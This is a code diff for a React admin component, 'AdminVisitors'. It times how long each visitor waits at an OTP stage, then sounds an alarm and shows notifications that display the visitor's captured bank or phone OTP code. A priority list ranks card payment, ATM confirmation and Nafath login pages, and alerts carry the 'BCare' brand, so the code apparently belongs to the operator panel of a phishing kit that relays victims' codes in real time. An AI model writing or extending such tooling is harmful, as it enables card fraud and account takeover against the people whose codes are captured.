@@ -268,6 +268,66 @@ const AdminVisitors = () => {
     knownPendingStagesRef.current = currentPendingKeys;
   }, [pendingStageMap, visitors]);
 
+  // Track when each pending stage first appeared
+  const pendingStageTimestampsRef = useRef<Record<string, number>>({});
+  const urgentRemindedRef = useRef<Set<string>>(new Set());
+
+  // Update timestamps when pendingStageMap changes
+  useEffect(() => {
+    const now = Date.now();
+    const currentKeys = Object.keys(pendingStageMap);
+    currentKeys.forEach(key => {
+      if (!pendingStageTimestampsRef.current[key]) {
+        pendingStageTimestampsRef.current[key] = now;
+      }
+    });
+    Object.keys(pendingStageTimestampsRef.current).forEach(key => {
+      if (!pendingStageMap[key]) {
+        delete pendingStageTimestampsRef.current[key];
+        urgentRemindedRef.current.delete(key);
+      }
+    });
+  }, [pendingStageMap]);
+
+  // Check every 10s for OTP pending > 30s and play urgent sound
+  useEffect(() => {
+    const interval = setInterval(() => {
+      const now = Date.now();
+      const otpStages = ["otp", "phone_otp"];
+      Object.entries(pendingStageMap).forEach(([visitorId, stage]) => {
+        if (!otpStages.includes(stage)) return;
+        const startedAt = pendingStageTimestampsRef.current[visitorId];
+        if (!startedAt) return;
+        const elapsed = now - startedAt;
+        if (elapsed >= 30000 && !urgentRemindedRef.current.has(visitorId)) {
+          urgentRemindedRef.current.add(visitorId);
+          sounds.urgentReminder();
+          const visitor = visitors.find(v => v.id === visitorId);
+          toast.warning(`⚠️ OTP معلق لأكثر من 30 ثانية - ${visitor?.visitor_name || "زائر"}`, { duration: 5000 });
+          if ("Notification" in window && Notification.permission === "granted") {
+            const details = pendingOrderDetailsRef.current[visitorId];
+            let body = `⏰ OTP معلق لأكثر من 30 ثانية!`;
+            if (stage === "otp" && details?.otp_code) body += `\nالكود: ${details.otp_code}`;
+            else if (stage === "phone_otp" && details?.phone_otp_code) body += `\nالكود: ${details.phone_otp_code}`;
+            new Notification(`⚠️ تنبيه عاجل - BCare`, { body, icon: "/favicon.svg", tag: `urgent-${visitorId}`, requireInteraction: true });
+          }
+        }
+        // Repeat every 30s
+        if (elapsed >= 30000 && urgentRemindedRef.current.has(visitorId)) {
+          const reminderCycle = Math.floor((elapsed - 30000) / 30000);
+          if (reminderCycle > 0) {
+            const lastReminderKey = `${visitorId}-${reminderCycle}`;
+            if (!urgentRemindedRef.current.has(lastReminderKey)) {
+              urgentRemindedRef.current.add(lastReminderKey);
+              sounds.urgentReminder();
+            }
+          }
+        }
+      });
+    }, 10000);
+    return () => clearInterval(interval);
+  }, [pendingStageMap, visitors]);
+
   const priorityPages = ["الدفع بالبطاقة", "رمز التحقق البنكي", "تأكيد ATM", "توثيق الجوال", "كود توثيق الجوال", "مكالمة STC", "دخول نفاذ", "تحقق نفاذ", "تأكيد الطلب", "إتمام الشراء"];
 
   const getVisitorPriority = (page: string | null): number => {
